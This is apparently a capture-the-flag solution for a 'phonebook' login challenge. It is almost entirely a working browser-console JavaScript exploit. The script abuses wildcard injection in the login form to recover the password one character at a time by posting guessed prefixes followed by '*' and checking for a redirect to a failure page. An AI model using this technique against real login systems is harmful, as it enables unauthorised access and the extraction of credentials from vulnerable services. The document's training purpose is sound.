# phonebook
You can now login using the workstation username and password! - Reese

```js
// run it in the DevTools Console
(async () => {
    let flag="HTB",dict="}{ abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!~.?@#$%^&-+=?<>😾".split('')
    while(1) {
        for (var s of dict) {
            const {url:u} = await fetch('/login',{body:new URLSearchParams({username:'*',password:flag+s+'*'}),method:"POST"})
            if (console.log(flag+s)||!u.includes("failed")&&(flag+=s)) break
        }
        if (['}','😾'].includes(s)) break
    }
})()
```
